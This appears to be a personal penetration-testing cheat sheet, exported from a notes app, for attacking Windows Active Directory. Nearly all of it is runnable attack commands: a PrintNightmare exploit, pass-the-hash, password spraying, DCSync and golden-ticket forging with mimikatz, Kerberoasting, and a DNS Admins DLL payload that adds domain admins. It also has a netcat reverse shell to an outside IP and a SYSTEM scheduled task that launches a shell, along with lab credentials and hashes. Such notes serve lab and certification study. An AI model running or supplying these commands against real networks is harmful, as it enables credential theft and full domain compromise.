Protocol: [MS-RPRN]: Print System Remote Protocol</code></pre><ul id="14b2a3a2-0497-4a73-90e6-eaa7c6ff7791" class="bulleted-list"><li style="list-style-type:disc">get latest impacket - </li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="722014c5-5b7e-40bf-b9c4-b0ae3745f4ad" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install</code></pre><p id="7f2b04fe-bb9c-4454-bec9-1cfed328089e" class="">Steps</p><ol type="1" id="6b55d2ea-1e67-4b09-abf3-fd75c46a9155" class="numbered-list" start="1"><li>create dll payload with msfvenom</li></ol><ol type="1" id="b42ca634-6758-4fb4-9085-e59af610a68f" class="numbered-list" start="2"><li>create listener on metasploit</li></ol><ol type="1" id="3fbf8157-1f7f-4590-9570-c42325e7e808" class="numbered-list" start="3"><li><code>smbserver.py share `pwd` -smb2support</code></li></ol><ol type="1" id="861fd0ba-5c3a-4e78-9c69-c17b64dd09c1" class="numbered-list" start="4"><li><code>python3 CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;DC IP&gt; &#x27;\\&lt;kali IP&gt;/share/shell.dll&#x27;</code></li></ol></details></li></ul></div></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">AD Lateral Movement</summary><div class="indented"><ul id="0b81bcb2-5142-4c19-8d4d-2d63215d0bb5" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Pass the Hash</span><div class="indented"><ul id="df1d9273-63c0-4c82-989c-bf8980ebc2f7" class="toggle"><li><details open=""><summary>Tools</summary><p id="a2061173-01fc-4af9-b7d2-ac320a08f1f0" class="">check hash - <code>crackmapexec smb $IP -u &lt;user&gt; -H &lt;hash&gt;</code></p><p id="4ecb1041-b8d7-4792-b242-64ae8d525a6a" class="">psexec</p><p id="7ec16435-0028-4f2a-b9ad-777ee26dcae1" class=""><code>cd /usr/share/doc/python3-impacket/examples/</code></p><p id="8f296251-3fc5-4309-9192-488ea9ed22c0" class=""><code>python </code><code><a href="http://psexec.py/">psexec.py</a></code><code> -hashes 57321e6a0eef2c45985c9fa49c5cd24f:57321e6a0eef2c45985c9fa49c5cd24f </code><code><a href="mailto:Administrator@10.11.1.121">Administrator@</a></code><code>$IP</code></p></details></li></ul></div></li></ul><ul id="7236b068-80ca-42af-a9da-175b0fe024f9" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Password Spray with CrackMapExec</span><div class="indented"><ul id="f8b13ada-a51c-4be9-b05f-e56e3057f610" class="toggle"><li><details open=""><summary>Command</summary><p id="4e1583b0-4657-4bed-a61f-dd0aba51ad8a" class=""><code>crackmapexec smb &lt;ip address&gt; -u users.txt -p passwords.txt --continue-on-success</code></p></details></li></ul></div></li></ul><ul id="9856d937-aa48-4cf5-a24e-3cdfbf4b0a64" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Overpass the Hash (logged on but don’t have hash)</span><div class="indented"><ul id="248fbeb3-d218-4ee7-a848-7375040033dd" class="toggle"><li><details open=""><summary>Steps</summary><ol type="1" id="5988a6c7-670e-43f0-bee6-2334962426c3" class="numbered-list" start="1"><li>Generate ticket for DC - ex. <code>net use \\dc02</code></li></ol><ol type="1" id="41561427-9840-4245-a6f2-7a7fdada1032" class="numbered-list" start="2"><li><code>psexec \\dc02 cmd</code></li></ol></details></li></ul></div></li></ul><ul id="e474022a-3c3a-466a-a6f1-9f0ec3d48f9b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Pass the Ticket</span><div class="indented"></div></li></ul><ul id="72f41802-efc0-4781-8af3-ed7cfa8e3ac3" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">psexec</span><div class="indented"><ul id="7285ae89-4950-454a-b68b-826d1db3e771" class="toggle"><li><details open=""><summary>Command</summary><p id="9ad93c4d-05a9-431e-b2d8-42a8223210ba" class=""><code>python </code><code><a href="http://psexec.py">psexec.py</a></code><code> &lt;user&gt;@&lt;IP&gt; then enter password</code></p><p id="48434293-3401-4471-ab28-feafa0a414f3" class=""><code>./PsExec64.exe -u alice -p aliceishere cmd /c C:\Users\Bethany\nc64.exe 192.168.119.131 80 -e cmd.exe</code></p></details></li></ul></div></li></ul><ul id="6923f223-4cba-4886-b3ab-cb65bf93199c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">EvilWinRM (port 5985)</span><div class="indented"><ul id="f494329d-a280-4157-8739-d06b736926d3" class="toggle"><li><details open=""><summary>Command</summary><p id="69c8f065-49fb-48f0-8ab8-c58b5a0b3740" class=""><code>evil-winrm -i $IP -u USER -p PASSWORD</code></p><p id="172686af-f635-8043-9697-dbdf15aac494" class=""><code>upload</code></p><p id="172686af-f635-80c8-a4b5-f079a7cbb540" class=""><code>.\mimikatz.exe &quot;COMMANDS&quot; exit</code></p></details></li></ul></div></li></ul><ul id="0e9bc794-a378-4957-bf2e-416a7b350389" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">DCSync to get hashes (Domain Admin or privileged user)</span><div class="indented"><ul id="172686af-f635-805f-b0ae-ebeca688ead3" class="toggle"><li><details open=""><summary>Add DCSync right</summary><p id="172686af-f635-8007-bf7d-c1ac7e2e2f2c" class=""><code>$cred = New-Object System.Management.Automation.PSCredential(&quot;htb.local\tester&quot;, $(ConvertTo-SecureString &quot;<br/>test123&quot; -AsPlainText -Force))<br/></code></p><p id="172686af-f635-8019-9daf-c6742b3fe8c4" class=""><code>Add-DomainObjectAcl -TargetIdentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity tester -Credential $cred -Rights DCSync -Verbose</code></p></details></li></ul><ul id="7c7f8145-e671-4e62-974d-af14b1cfc5de" class="toggle"><li><details open=""><summary>Command</summary><p id="8653d91b-81d8-4424-95a0-c00220311808" class=""><code><strong>lsadump::dcsync /user:Administrator</strong></code></p><p id="172686af-f635-80cb-ad55-fe76cb026fcb" class=""><code>sudo python3 </code><code><a href="http://secretsdump.py/">secretsdump.py</a></code><code> -just-dc-ntlm &lt;domain&gt;/&lt;user&gt;@&lt;DC IP&gt;</code></p></details></li></ul></div></li></ul><ul id="d73f0aae-a823-4d4f-b8b7-ae434d026781" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Golden Ticket (krb-tgt hash)</span><div class="indented"><ul id="ef6c26c8-6c8b-4a6b-a179-d60f8ac52c6b" class="toggle"><li><details open=""><summary>Command</summary><p id="5080de19-4758-40e3-aca4-adf55be046cb" class=""><code>privilege::debug</code></p><p id="600d2097-da4f-4cd0-900c-50304ea755e4" class=""><code><strong>lsadump::lsa /patch</strong></code></p><p id="52393b1f-4e8d-40ab-9570-44c91ecfcc3c" class="">get krbtgt hash</p><p id="5a3e735f-6b41-4405-9cff-3f7c7afd3eee" class=""><code><strong>kerberos::purge</strong></code></p><p id="4fe57a8a-44ea-4173-af8d-226e628225e4" class="">get SID from whoami /user</p><p id="c1e10551-6208-4a47-86b3-6023a496218b" class=""><code><strong>kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt</strong></code></p><p id="3852c523-84e4-4b72-81ca-298f50930c27" class=""><code><strong>misc::cmd</strong></code></p></details></li></ul></div></li></ul><ul id="f7ee3af0-fb30-455f-abee-e9d2d6f16146" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Service Accounts <code>PrincipalsAllowedToRetrieveManagedPassword</code></span><div class="indented"></div></li></ul><ul id="41ec7698-a28b-4ec1-966b-a5aed48553cd" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Token Impersonation</span><div class="indented"><ul id="9fea9baa-4e58-41a2-b0e9-e5b139294525" class="toggle"><li><details open=""><summary>Steps</summary><ol type="1" id="9caa210f-95b1-4ce5-a391-834294c51fe5" class="numbered-list" start="1"><li>In meterpreter, <code>load incognito</code></li></ol><ol type="1" id="3046d577-85e1-448b-a6f4-82e419c766d3" class="numbered-list" start="2"><li><code>list_tokens -u</code></li></ol></details></li></ul></div></li></ul><ul id="a16002c3-3500-4664-b322-25cc59a0cfed" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Dump Hashes</span><div class="indented"><ul id="e672b5be-54dc-4b55-b8f4-7ec902c91e8b" class="toggle"><li><details open=""><summary>Steps</summary><p id="04df0bd9-6df5-46ec-8812-e29a2b70812c" class=""><code>secretsdump.py &lt;domain&gt;/user:&#x27;&lt;password&gt;&#x27;@&lt;IP Address&gt;</code></p></details></li></ul></div></li></ul><ul id="176686af-f635-80ef-8f65-caee051e056d" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">PS Remote</span><div class="indented"><ul id="176686af-f635-80e7-905c-ec549106d3ec" class="toggle"><li><details open=""><summary>Steps</summary><p id="176686af-f635-80eb-976e-f6b8e59f3bc7" class=""><code>New-PSSession -ComputerName thmserver1.za.tryhackme.loc</code></p><p id="176686af-f635-80cb-ae47-d1cfb78de796" class=""><code>Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc</code></p></details></li></ul></div></li></ul><ul id="17d686af-f635-8024-86d4-ff773b9253ff" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Mimikatz list tickets</span><div class="indented"><ul id="17d686af-f635-80a8-a265-fbf7b5a8e145" class="toggle"><li><details open=""><summary>Steps</summary><p id="17d686af-f635-801f-8154-dd9f6167af5e" class="">privilege::debug</p><p id="17d686af-f635-80cc-b761-eba26bddfbb5" class="">token::elevate</p><p id="17d686af-f635-801f-8b2f-fd254aba3de9" class="">sekurlsa::tickets</p></details></li></ul></div></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">AD Privilege Escalation</summary><div class="indented"><ul id="eefee05e-cb30-4830-b07c-d1f132d3e43d" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Kerberoast</span><div class="indented"><ul id="17024fdd-d514-4b9a-9804-0636136a50a6" class="toggle"><li><details open=""><summary>Steps</summary><ul id="dec1bb98-4160-4eba-a98b-3b95d8cb1081" class="bulleted-list"><li style="list-style-type:disc">use certutil to download Invoke-Kerberoast.ps1</li></ul><ul id="de4c4bb7-b760-4976-8ba2-2a0ef3c43591" class="bulleted-list"><li style="list-style-type:disc"><code>powershell -ep bypass -c &quot;Import-Module .\Invoke-Kerberoast.ps1 ; Invoke-Kerberoast -OutputFormat Hashcat&quot;</code></li></ul><ul id="92b90a72-971b-41b0-a7d0-5ecec989b3e7" class="bulleted-list"><li style="list-style-type:disc"><code>Import-Module .\Invoke-Kerberoast.ps1</code></li></ul><ul id="87bc5ff7-182b-4dc2-9e42-2f1d04954965" class="bulleted-list"><li style="list-style-type:disc"><code>Invoke-Kerberoast -OutputFormat Hashcat</code></li></ul></details></li></ul><ul id="7140c18a-fb15-4c03-b436-e3d805e44def" class="toggle"><li><details open=""><summary>GetUserSPNs.py</summary><p id="73859801-7d95-4e43-bfe8-98db09d16377" class=""><code>GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter &#x27;DOMAIN/USER:Password&#x27;</code></p></details></li></ul><ul id="172686af-f635-80cb-ae9f-f5d9f1c35396" class="toggle"><li><details open=""><summary>Hashcat</summary><p id="172686af-f635-8060-9e9a-f6865e5a9356" class=""><code>hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt</code></p></details></li></ul></div></li></ul><ul id="d0abc75e-7ffc-4814-a231-fa4edf3f1c3c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Create Scheduled Task with credentials</span><div class="indented"><ul id="ee620370-8218-4565-a5de-2c06cb2699c4" class="toggle"><li><details open=""><summary>Steps</summary><p id="193e28e4-57df-4c30-84e4-a756608eddbd" class="">read hutch writeup</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68ad2bc0-ca34-4fd1-8013-81c0a9ce36ba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">c:\windows\system32\inetsrv&gt;powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv&gt; $pw = ConvertTo-SecureString &quot;T4E@d8!/od@l36&quot; -AsPlainText -Force
$pw = ConvertTo-SecureString &quot;T4E@d8!/od@l36&quot; -AsPlainText -Force
PS C:\windows\system32\inetsrv&gt;

PS C:\windows\system32\inetsrv&gt; $creds = New-Object System.Management.Automation.PSCredential (&quot;Administrator&quot;, $pw)
$creds = New-Object System.Management.Automation.PSCredential (&quot;Administrator&quot;, $pw)
PS C:\windows\system32\inetsrv&gt;

PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
SUCCESS: The scheduled task &quot;shell&quot; has successfully been created.
PS C:\windows\system32\inetsrv&gt;

PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
SUCCESS: Attempted to run the scheduled task &quot;shell&quot;.</code></pre></details></li></ul></div></li></ul><ul id="135dc973-be86-4272-ad93-34770eecf338" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Logged on password hashes</span><div class="indented"><ul id="3ec3a9d4-fd92-4f25-b8c8-08029c4c8cab" class="toggle"><li><details open=""><summary>Steps</summary><p id="ededbac1-48b8-4c2d-9864-1c789146b081" class=""><strong><code>privilege::debug</code></strong></p><p id="d9c89a30-cf56-4f8e-b19b-8041f1b6bb87" class=""><strong><code>sekurlsa::logonpasswords</code></strong></p><p id="172686af-f635-8054-bc58-e3697ab6ff53" class=""><code><strong>sekurlsa::msv</strong></code></p></details></li></ul></div></li></ul><ul id="94db38ac-43b2-401e-a03a-218c73cfea33" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Dump SAM</span><div class="indented"><ul id="e2f8fd56-d1dc-4a17-b77c-a306b8cc676a" class="toggle"><li><details open=""><summary>Steps</summary><p id="a638395c-c680-4a42-be93-4343ea256aea" class="">crackmapexec - <code>crackmapexec smb $IP -u &lt;user&gt; -H &lt;hash&gt; --sam</code></p><p id="d5f7403c-2cb3-45f0-accd-9f48fc84804e" class="">mimikatz -</p><p id="2574471c-deae-4f7a-a28e-b0b712ebbfa9" class=""><code><strong>privilege::debug</strong></code></p><p id="55743968-c6d5-4d6c-80cf-34c7d429ad11" class=""><code>token::elevate</code></p><p id="37b2fa43-96b3-4d2a-973a-5ddda4b22837" class=""><code>lsadump::sam</code></p><p id="b85b0e77-c8ba-4ad1-a9a6-402f03da2516" class=""><code>lsadump::secrets</code></p><p id="da40e7aa-6871-4e3c-b056-0fb581778c77" class=""><code>lsadump::cache</code></p></details></li></ul></div></li></ul><ul id="83b412a6-092c-4a33-bdc2-50b6b0e14bb3" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Bypassing UAC</span><div class="indented"><ul id="5ca0c5f3-0b6a-4bf4-b252-f9935a7759f0" class="toggle"><li><details open=""><summary>Steps</summary><figure id="14f75bc5-cc35-4426-b8e9-ef9286da3d75"><div class="source">https://github.com/k4sth4/UAC-bypass</div></figure><p id="870b2d8b-a0c1-4a35-a90a-72e9129e834d" class="">search uac on metasploit</p></details></li></ul></div></li></ul><ul id="16fe9e6e-0478-4dd3-83a9-d1d58c3b7e49" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Abusing GPOs</span><div class="indented"><ul id="24ebac54-2601-4314-b2dc-245075bb271b" class="toggle"><li><details open=""><summary>Steps</summary><p id="18ce4ec6-dca4-41f7-b3d5-2a43cdc1f2a5" class=""><code>standin.exe --gpo</code></p><p id="ef7daa3c-dec5-4796-a116-8e4bf2162910" class="">check for FullControl or ChangePermissions <code>standin.exe --gpo --filter &quot;Default Domain Policy&quot; --acl</code></p><p id="9a773f0e-ff86-4203-bc9c-54fa36fa1040" class=""><code>standin.exe --gpo --filter &quot;Default Domain Policy&quot; --localadmin USER</code></p><p id="2b6ced1f-59dd-4831-a774-ef778c085ea0" class=""><code>gpupdate /force</code></p></details></li></ul></div></li></ul><ul id="d09a6775-bdc6-4672-8d56-e1debde2a052" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Sharphound and Bloodhound</span><div class="indented"><ul id="977efe01-43d2-4452-b863-13e7e06da469" class="toggle"><li><details open=""><summary>Steps</summary><ul id="1dc9c36e-3670-4423-9c53-778305243903" class="bulleted-list"><li style="list-style-type:disc">neo4j console</li></ul><ul id="172686af-f635-8090-8aa1-c9fa5453432f" class="bulleted-list"><li style="list-style-type:disc"><a href="http://localhost:7474">localhost:7474</a> to set password</li></ul><p id="9d6944d0-9c33-42c3-9231-3d0e90c89fc1" class="">clear old data with <code>match (a) -[r] -&gt; () delete a, r</code> and <code>match (a) delete a</code></p><ul id="cc1b0a47-e9d7-41d4-a4e8-6857cb4b7954" class="bulleted-list"><li style="list-style-type:disc">bloodhound</li></ul><p id="dc235c7d-fbef-4522-850d-0a8752117919" class="">enter <code>neo4j:password</code> to bloodhound</p><ul id="15c37437-0253-4511-9ca6-b89a53dafee3" class="bulleted-list"><li style="list-style-type:disc">powershell -ep bypass</li></ul><ul id="8cb3b203-d85c-4879-8e24-f9bd13516ffc" class="bulleted-list"><li style="list-style-type:disc">. .\SharpHound.ps1</li></ul><ul id="ceee1d48-8958-4241-940c-7c6276b06268" class="bulleted-list"><li style="list-style-type:disc">Invoke-BloodHound -CollectionMethod All -Domain &lt;domain&gt; -ZipFileName hounddata.zip</li></ul><ul id="8d62deb6-cdef-4ac9-bb3e-2376785713b8" class="bulleted-list"><li style="list-style-type:disc"><code>python bloodhound-python -c All -u &lt;username&gt; -p &lt;password&gt; -dc &lt;full TLD dc-name&gt; -d &lt;domain&gt; -ns &lt;dns ip&gt; --zip</code></li></ul><ul id="2a1e381d-9223-4d4a-b0f5-3128826acb78" class="bulleted-list"><li style="list-style-type:disc"><code>proxychains -q bloodhound-python -c All -u &lt;username&gt; -p &lt;password&gt; -dc &lt;full dc domain name&gt; -d &lt;domain&gt; -ns &lt;DC IP&gt; --dns-tcp</code></li></ul></details></li></ul><ul id="172686af-f635-8009-9d6a-f8ecec923127" class="toggle"><li><details open=""><summary>Priv Esc Active Directory Security Groups</summary><ul id="172686af-f635-80f9-8ab1-fd4ef8645c38" class="toggle"><li><details open=""><summary>Account Operators</summary><ul id="173686af-f635-8073-96e8-f07c9cd7f182" class="bulleted-list"><li style="list-style-type:disc">can add user to Windows Exchange group and abuse DC sync</li></ul><p id="173686af-f635-8047-ae7a-f0fb0715035d" class="">Create User - <code>net user /domain /ADD tester password123</code></p><p id="173686af-f635-8051-8895-fd42ed695679" class=""><code>net group &quot;Exchange Windows Permissions&quot; /ADD &quot;tester&quot;</code></p><p id="173686af-f635-80b0-aa15-cfb741d004cb" class="">Allow remote login - <code>net localgroup &quot;Remote Desktop Users&quot; /ADD &quot;tester&quot;</code></p><p id="173686af-f635-801c-a5ad-d65d17b25950" class="">Remote manager - <code>net localgroup /add &quot;Remote Management Users&quot; tester</code></p><p id="173686af-f635-8003-a346-c5bb55088731" class=""><code>Add-ObjectACL -PrincipalIdentity tester -Credential $Cred -Rights DCSync</code></p></details></li></ul><ul id="173686af-f635-805c-98a3-dc8b9015a74f" class="toggle"><li><details open=""><summary>DNS Admins</summary><p id="173686af-f635-8026-9e89-d784e630e083" class="">*may not have permission to stop and start dns</p><p id="173686af-f635-802d-8868-c5e1251c45b6" class=""><code>msfvenom -p windows/x64/exec cmd=&#x27;net user test password123! /DOMAIN /ADD&#x27; -f dll &gt; dns.dll</code></p><p id="173686af-f635-8079-ba2d-c445d2e379d9" class=""><code>msfvenom -p windows/x64/exec cmd=&#x27;net group &quot;Domain Admins&quot; test /DOMAIN /ADD&#x27; -f dll &gt; dns.dll</code></p><p id="173686af-f635-8096-929f-ed1e5fcfa11a" class=""><code>python3 </code><code><a href="http://smbserver.py/">smbserver.py</a></code><code> -smb2support share .</code></p><p id="173686af-f635-806d-907e-fa53adb212f2" class="">on victim:</p><p id="173686af-f635-8051-a1ec-f0d80c33fa3b" class=""><code>cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.3\share\dns.dll</code></p><p id="173686af-f635-804b-bb44-ed93e7862bad" class=""><code>sc.exe stop dns</code></p><p id="173686af-f635-8055-83cc-f329c15a6018" class=""><code>sc.exe start dns</code></p></details></li></ul></details></li></ul></div></li></ul><ul id="176686af-f635-8049-b869-fa8119a96253" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Kerberos Delegation</span><div class="indented"><ul id="176686af-f635-8088-a526-e2ffc2e2ddbe" class="toggle"><li><details open=""><summary>Unconstrained Delegation</summary><ul id="176686af-f635-806f-9789-c6a96a4a197e" class="bulleted-list"><li style="list-style-type:disc">user or service is allowed to delegate authentication to any other user or service</li></ul></details></li></ul><ul id="176686af-f635-808a-a2a3-da9aa3713547" class="toggle"><li><details open=""><summary>Constrained Delegation</summary><ul id="176686af-f635-8033-8643-d547e4b04c80" class="bulleted-list"><li style="list-style-type:disc">more restricted version of unconstrained where delegating authentication is limited to services which are explicitly defined and group managed service accounts can’t be touched</li></ul><ul id="176686af-f635-8038-a8f0-e0ea953ca0c5" class="toggle"><li><details open=""><summary>Windows</summary><p id="176686af-f635-80b1-b388-c2fa99b6f3dd" class="">powerview enumerate accounts - </p><p id="176686af-f635-8062-ae71-dcaf332f0b1d" class=""><code><strong>Get-DomainUser –TrustedToAuth 2&gt;$null</strong></code></p><p id="176686af-f635-8012-885f-d9e2b5c543ab" class=""><code><strong>Get-DomainComputer –TrustedToAuth 2&gt;$null</strong></code></p><p id="176686af-f635-8078-a90a-f1589bc04746" class="">get TGT with compromised user with delegation permissions - </p><p id="176686af-f635-803d-a4fa-e3f40aeca31d" class=""><code>.\Rubeus.exe asktgt /user:userName /domain:DomainName /ntlm:Hash /outfile:FileName.tgt</code></p><p id="176686af-f635-8012-b124-d64dbdc66142" class="">get TGS with delegation permissions - </p><p id="176686af-f635-80f3-b19f-ceaf60e88172" class=""><code>.\Rubeus.exe s4u /ticket:TGT_Ticket /msdsspn:&quot;service/HOST&quot; /impersonateuser:Administrator /altservice:</code> <code> /ptt</code></p><p id="176686af-f635-803c-948b-fce74d3fc98f" class="">Options for altservice: HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights), WWW (WMI)</p></details></li></ul><ul id="176686af-f635-806f-8e22-f583e02d58e1" class="toggle"><li><details open=""><summary>Linux</summary><p id="176686af-f635-8063-a24b-f56fc58f78c1" class="">get TGS for delegated service</p><p id="176686af-f635-8091-b392-e1f266d58935" class=""><code>python3 </code><code><a href="http://getst.py/">getST.py</a></code><code> -spn &lt;SPN you have delegation&gt;/&lt;DC TLD&gt; &#x27;&lt;domain&gt;/&lt;owned account&gt;&#x27; -hashes c47a331c752d98d42c7831f12c8ecb04:c47a331c752d98d42c7831f12c8ecb04 -impersonate Administrator -altservice HOST -dc-ip 10.10.10.248</code></p><p id="176686af-f635-809c-abff-e94cf16438ee" class="">let other impacket tools reference ticket</p><p id="176686af-f635-8059-803f-e049e59a1301" class=""><code>export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache</code></p><p id="176686af-f635-804a-a68e-ca6d85d24941" class=""><code>python3 </code><code><a href="http://psexec.py/">psexec.py</a></code><code> -no-pass -k administrator@dc.intelligence.htb</code></p><p id="177686af-f635-80bd-9860-d99a4f7309b9" class=""><code>impacket-wmiexec -no-pass -k administrator@dc.intelligence.htb</code></p><p id="177686af-f635-8018-b25b-f60baad98726" class="">USE MACHINE NAME NOT IP, OTHERWISE KERBEROS WON’T WORK</p></details></li></ul></details></li></ul><ul id="176686af-f635-80b7-8dce-ccf801c4d8d2" class="toggle"><li><details open=""><summary>RBCD Delegation</summary><ul id="177686af-f635-80ed-83bf-f2378de62466" class="bulleted-list"><li style="list-style-type:disc">delegation where service determines which service accounts can access it</li></ul></details></li></ul><ul id="176686af-f635-80fb-ad3c-dd28fefa2e32" class="toggle"><li><details open=""><summary>Sources</summary><ul id="176686af-f635-8050-8ff8-f381aa5b19a9" class="bulleted-list"><li style="list-style-type:disc"><a href="https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13">https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13</a></li></ul><ul id="176686af-f635-808c-9d8a-e10c9ff6b8fd" class="bulleted-list"><li style="list-style-type:disc"><a href="https://redfoxsec.com/blog/attacking-kerberos-delegation/">https://redfoxsec.com/blog/attacking-kerberos-delegation/</a></li></ul><ul id="176686af-f635-8078-ba14-e4525cb5ce33" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.onsecurity.io/blog/abusing-kerberos-from-linux/">https://www.onsecurity.io/blog/abusing-kerberos-from-linux/</a></li></ul></details></li></ul></div></li></ul><ul id="173686af-f635-80ce-8347-c7cffeb99405" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">NoPac</span><div class="indented"><ul id="173686af-f635-804b-b39b-f4d21e89d943" class="toggle"><li><details open=""><summary>steps</summary><p id="173686af-f635-80b4-ad0d-ffda60b18ae1" class=""><code>git clone </code><code><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></code></p><p id="173686af-f635-806f-87d5-dc0961372979" class=""><code>python3 </code><code><a href="http://scanner.py/">scanner.py</a></code><code> &lt;domain&gt;/&lt;user&gt;:&#x27;&lt;password&gt;&#x27; -dc-ip &lt;IP&gt; </code></p><p id="173686af-f635-8007-afff-ed3363a61c4a" class=""><code>python3 </code><code><a href="http://nopac.py/">noPac.py</a></code><code> &lt;domain&gt;/&lt;user&gt;:&#x27;&lt;password&gt;&#x27; -dc-ip &lt;IP&gt; --impersonate administrator -dump</code></p></details></li></ul></div></li></ul><ul id="176686af-f635-80ce-b699-e5916f277ab9" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Certificates</span><div class="indented"><ul id="176686af-f635-8075-b636-f2d301002b3f" class="toggle"><li><details open=""><summary>steps</summary><p id="176686af-f635-80bd-83fd-ec066f7e3801" class=""><code>certipy-ad find -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip $IP -vulnerable -stdout</code></p></details></li></ul></div></li></ul><ul id="174686af-f635-8076-ba04-c3faf737b581" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">LAPS</span><div class="indented"><ul id="174686af-f635-8057-9444-e9bd6c933660" class="toggle"><li><details open=""><summary>steps</summary><p id="174686af-f635-80df-9bc5-f568a3196b7b" class=""><code>ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b &quot;DC=hutch,DC=offsec&quot; -h 192.168.120.108 &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code></p></details></li></ul></div></li></ul><ul id="175686af-f635-80e1-8166-d172ff3796f8" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">AD Recycle Bin</span><div class="indented"><ul id="175686af-f635-807d-9c0d-e2051efb2f8a" class="toggle"><li><details open=""><summary>steps</summary><p id="175686af-f635-801c-a126-f22e50f538e1" class="">Gets deleted AD object properties - must be in AD Recycle Bin group</p><p id="175686af-f635-80ef-b4e1-f7f4a647bada" class=""><code>Get-ADObject -filter &#x27;isDeleted -eq $true&#x27; -includeDeletedObjects -Properties *</code></p></details></li></ul></div></li></ul></div></details></div></details></div></article><span class="sans" 